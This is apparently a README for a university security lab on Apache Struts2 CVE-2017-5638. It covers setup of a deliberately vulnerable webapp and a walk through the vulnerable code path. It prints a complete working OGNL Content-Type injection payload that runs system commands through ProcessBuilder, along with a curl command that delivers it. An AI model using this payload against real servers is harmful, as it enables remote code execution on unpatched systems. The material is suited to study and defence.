# Apache Struts2 Vulnerability | CVE-2017-5638 | Version 2.5

## Disclaimer

*This is meant for educational, and research purposes only. I do not authorize or endorse any illegal or unethical use of this projects contents or information*

## Instructions

To run the webapp:
* java -jar ms-cybersecurity-1.jar (uses embedded Tomcat)
* Java 1.8
* the webapp boots on port 8080 by default (http://localhost:8080/MSCybersecurity)

To Send commands use command line emulator (Send.jar) [project](https://github.com/grant100/cybersecurity-struts2-send):

*blank url defaults to http://localhost:8080/MSCybersecurity/exploit, you must be on /exploit endpoint*

![send](src/main/resources/META-INF/resources/images/send.png)

* java -jar Send.jar

If you want to modify this source, the project uses the Maven build system:
* When modifying source: mvn package (create .jar)

NVD [CVE-2017-5638](https://nvd.nist.gov/vuln/detail/CVE-2017-5638)

## The Payload

The clever aspect of this vulernability is the exploitation of OGNL (Object Graph Navigation Library).

OGNL uses expressions to perform tasks, and two of the expressions that are allowed is the ability to invoke arbitrary classes in the framework, and chain events. Reference guide [OGNL Language Guide](https://commons.apache.org/proper/commons-ognl/language-guide.html).

So for example, it is possible then to instantiate edu.uvu.ms.cybersecurity.Command object with OGNL 
 
    //  OGNL expression to instantiate Command obj
    (#cmd='whoami').(#p=new edu.uvu.ms.cybersecurity.Command(#cmd)).(#p.print('hello from MSCybersecurity'))
  
The edu.uvu.ms.cybersecurity.Command class

    // Command simply prints the cmd argument passed from the OGNL expression
    public class Command {
      private Object cmd;
      
      public Command(Object cmd){
        this.cmd = cmd;
      }

      private void print(){
          System.out.println("OGNL recieved cmd: "+this.cmd);
      }
      
      public void print(String loc){
          System.out.println("OGNL recieved cmd: "+this.cmd+" from "+loc);
      }
    }
     
 Or, in a more practical sense, one can invoke the java.lang.ProcessBuilder class to run system level commands 
  
    (#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start())

The following payload contains a command to invoke edu.uvu.ms.cybersecurity.Command and print the command issued to the server into the console, and then proceed to execute the command. (to illustrate chaining of events, and invoking classes)


    Content-Type:  %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#p=new edu.uvu.ms.cybersecurity.Command(#cmd)).(#p.print('hello from MSCybersecurity')).(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}


Deliver the payload with CURL

    curl -H "Content-Type:  %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#p=new edu.uvu.ms.cybersecurity.Command(#cmd)).(#p.print('hello from MSCybersecurity')).(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}" -X POST http://localhost:8080/MSCybersecurity/exploit

A portion of this payload was pulled from [Rapid7 GitHub](https://github.com/rapid7/metasploit-framework/issues/8064)

## The Breakdown (as viewed from my IDE)

The Jakarta MultiPart Parser:
   
The issue is how the Parser doesn't escape incoming values in the Content-Type header. What this means is that an OGNL expression can be packaged into the Content-Header. When the header is determined that it is MultiPart it sends it off to the OgnlTextParser.class, which simply interprets the OGNL expression and subsequently ends up executing arbitrary commands.

The following is a step-by-step look at how this vulnerability is exploited.

The Struts2 Dispatcher: org.apache.struts2.dispatcher.Dispatcher

The Struts Dispatcher.class receives the request, and determines that it should be handled by the JakartaMultiPart library and invokes the *MultiPartRequestWrapper()* constructor
![Dispatcher](src/main/resources/META-INF/resources/images/Dispatcher-wrapRequest.png)

he OGNL expression from the Content-Type header is then passed into the *parse()* method. Because the header information is bad, the parser will raise an exception and call the *buildErrorMessage()* method 

![Dispatcher](src/main/resources/META-INF/resources/images/JakartaMultiPartRequest-parse.png)

The *buildErrorMessage()* method attempts to find an appropriate error message to return to the user, however, in order to do this, it has to uses the LocalizedTextUtil.class *findText()* method

![Dispatcher](src/main/resources/META-INF/resources/images/JakartaMultiPartRequest-buildError.png)

The LocalizedTextUtil.class findText method will in turn call *getDefaultMessage()* and pass in the Content-Type information 

![Dispatcher](src/main/resources/META-INF/resources/images/LocalizedTextUtil-findText.png)

The *getDefaultMessage()* message will then delegate to TextParseUtil.class *translateVariables()* method

![Dispatcher](src/main/resources/META-INF/resources/images/LocalizedTextUtil-getDefaultMessage.png)

The TextParseUtil.class *translateVariables()* method delegates to the OgnlTextParser.class evaluate method

![Dispatcher](src/main/resources/META-INF/resources/images/TextParseUtil-translateVariables.png)

The result being that any OGNL expressions are now executed

![Dispatcher](src/main/resources/META-INF/resources/images/OglnTextParser-evaluate.png)

                      
